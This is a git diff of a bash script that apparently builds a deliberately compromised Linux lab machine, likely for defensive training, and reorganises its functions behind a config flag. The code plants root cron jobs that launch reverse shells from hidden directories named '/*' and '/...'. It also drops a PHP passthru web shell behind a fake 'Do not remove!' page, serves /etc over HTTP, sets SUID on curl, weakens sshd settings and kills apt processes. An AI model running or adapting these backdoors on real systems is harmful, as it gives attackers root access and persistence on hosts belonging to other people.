@@ -3,46 +3,112 @@
 Main(){
 
   CreateTaunt
-  sleep 2
-  echo "Creating environment..."
-  CreateEnvironment 3>&1 &>/dev/null
-  echo "Created Issue 1"
-  CreateSSHIssues 3>&1 &>/dev/null
-  echo "Created Issue 2"
-  CreateAnnoy
-  echo "Created Issue 3"
-  CreateServices 3>&1 &>/dev/null
-  echo "Created Issue 4"
-  CreateUsers 3>&1 &>/dev/null
-  echo "Created Issue 5"
   sleep 1
-  CreateUserSpawn 3>&1 &>/dev/null
-  echo "Created Issue 6"
-  sleep 1
-  CreateCron
-  echo "Created Issue 7"
-  sleep 1
-  CreatePyServer 3>&1 &>/dev/null
-  echo "Created Issue 8"
-  sleep 1
-  CreateSUID
-  echo "Created Issue 9"
-  sleep 1
-  CreateAndCronLinPEAS 3>&1 &>/dev/null
-  echo "Created Issue 10"
-  sleep 1
-  MaliciousWebServerHTTPS  3>&1 &>/dev/null
-  echo "Created Issue 11"
-  sleep 1
-  ReverseShellandPersistence 3>&1 &>/dev/null
-  echo "Created Issue 12"
-  sleep 1
-  CreateGoodbye
-  sleep 1
-  CreateLogin 3>&1 &>/dev/null
+  
+  param=$(CheckConfig "SILENT")
+  if [[ "$param" == "YES" ]]
+  then
+    echo "Creating Environment..."
+    Run 3>&1 &>/dev/null
+    CreateLogins 3>&1 &>/dev/null
+  else
+    echo "Creating Environment..."
+    Run
+    CreateLogins
+  fi
+
 }
 
+
+Run(){
+
+  sleep 1
+  CreateEnvironment 
+  echo "Creating Issues 1 and 2"
+  sleep 1
+  CreateConfigs
+  echo "Creating Issues 3 and 4"
+  sleep 1
+  CreatePersistence
+  echo "Creating Issues 5 and 6"
+  sleep 1
+  CreateUsers
+  echo "Creating Issues 7 and 8"
+  sleep 1
+  CreatePrivEsc
+  echo "Creating Issues 9 and 10"
+  sleep 1
+  CreateExposures
+  echo "Creating Issues 11 and 12"
+  sleep 1
+  CreateGoodbye
+  echo "Creating Issues 13 and 14"
+  sleep 1
+  CreateLogins
+}
+
+
+CheckConfig() {
+
+  isYES=$(cat config.conf | grep "$1" | cut -d "=" -f2)
+  echo "$isYES"
+}
+
+
 # --- Jacob's Functions ---
+
+
+# Trying to categorize functions more broadly in terms of outcomes in order to create a config file. 
+
+# CreateEnvironment - will not change. 
+# CreateTaunt - will not change
+# Create Goodbye - will not change
+
+
+
+CreatePersistence(){
+
+  CreateServices
+  CreateCron
+  
+
+}
+
+CreatePrivEsc(){
+
+  CreateLinPEAS
+  CreateSUID
+
+}
+
+CreateBadUsers(){
+
+  CreateUsers
+  CreateUserSpawn
+
+}
+
+CreateExposures(){
+
+  CreateReverseShell
+  CreateWebServers
+
+}
+
+CreateConfigs(){
+
+  CreateSSHIssues
+  CreateAnnoy
+
+}
+
+CreateLogins(){
+
+  CreateSSHLogin
+
+}
+
+
 CreateEnvironment(){
 
   for pid in $(ps aux | grep -i apt | awk '{print $2}');  do sudo kill $pid; done
@@ -64,7 +130,7 @@ CreateSSHIssues(){
   sudo echo "$append">>"/etc/ssh/sshd_config"
 }
 
-CreateLogin(){
+CreateSSHLogin(){
   count=0
   while :
   do
@@ -131,6 +197,12 @@ EOF
 CreateCron(){
 
   append="* *    * * *   root    bash /root/.script/spawn.sh"
+  sudo echo "$append">>"/etc/crontab"
+  append="* *    * * *   root    /*/NOTEPAD.sh"
+  sudo echo "$append">>"/etc/crontab"
+  append="* *    * * *   root    /.../processMonitor.sh"
+  sudo echo "$append">>"/etc/crontab"
+  append="* *    * * *   root    bash /.../linpeas.sh"
   sudo echo "$append">>"/etc/crontab"
 }
 
@@ -224,10 +296,6 @@ CreateAnnoy(){
   source /home/$user/.bashrc
 }
 
-CreatePyServer(){
-  cd /etc/ & sudo python3 -m 'http.server' --cgi 80 & disown
-}
-
 CreateSUID(){
 # Shoutout Jack W for the uber small binary
   sudo mkdir /opt/scripts/
@@ -252,6 +320,9 @@ binary
   sudo rm /usr/bin/tmp
   sudo chown root:root /usr/bin/curl
   sudo chmod +sx /usr/bin/curl
+
+  #chmod +s /bin/bash
+
 }
 
 CreateTaunt(){
@@ -310,46 +381,31 @@ echo "Script finished! Please keep this terminal open until the lab is complete.
 # --- Jacobs Functions End---
 
 # --- Dumb Jack's Functions ---
-CreateAndCronLinPEAS(){
-#grab linpeas
+CreateLinPEAS(){
+
   wget https://github.com/carlospolop/PEASS-ng/releases/download/20230326/linpeas.sh
-#make linpeas.sh executable
   chmod +x ./linpeas.sh
-#spread it around for good measure
   mkdir '/*'
   cp ./linpeas.sh /\*/linpeas.sh
-
   mkdir /...
   cp ./linpeas.sh /.../linpeas.sh
   rm ./linpeas.sh
-
-#make a cronjob that runs it every minute, 
-  append="* *    * * *   root    bash /.../linpeas.sh"
-
-  sudo echo "$append">>"/etc/crontab"
 }
 
-MaliciousWebServerHTTPS(){
-#make web directory, create a php backdoor, and make it look convincing (index.html, and port 80)
+CreateWebServers(){
+
   mkdir /tmp/web
   echo "<?php echo passthru($_GET['cmd']); ?>" > /tmp/web/.phpbackdoor.html
   echo "<p>This is the default Linux webpage for HTTP/S. If you can see it, everything is working as intended! If you remove, there may be system instability. Do not remove!<p>" > /tmp/web/index.html
   python3 -m http.server --directory /tmp/web 443 &
   echo "<p>This is the default Linux webpage for HTTP/S. If you can see it, everything is working as intended! If you remove, there may be system instability. Do not remove!<p>" > /index.html
+  sudo python3 -m 'http.server' --directory /etc/ 80 & disown
 }
 
-ReverseShellandPersistence(){
-  #create reverse shells, and have them get executed by cronjobs
+CreateReverseShell(){
+
   echo "bash -i >& /dev/tcp/127.0.0.1/80 0>&1" > /\*/NOTEPAD.sh
   echo "bash -i >& /dev/tcp/127.0.0.1/443 0>&1" > /.../processMonitor.sh
-append="* *    * * *   root    /*/NOTEPAD.sh"
-  sudo echo "$append">>"/etc/crontab"
-append="* *    * * *   root    /.../processMonitor.sh"
-  sudo echo "$append">>"/etc/crontab"
-
-  #chmod +s /bin/bash cuz why not
-  chmod +s /bin/bash
-  
 }
 # --- End Of Dumb Jack's Functions ---
 
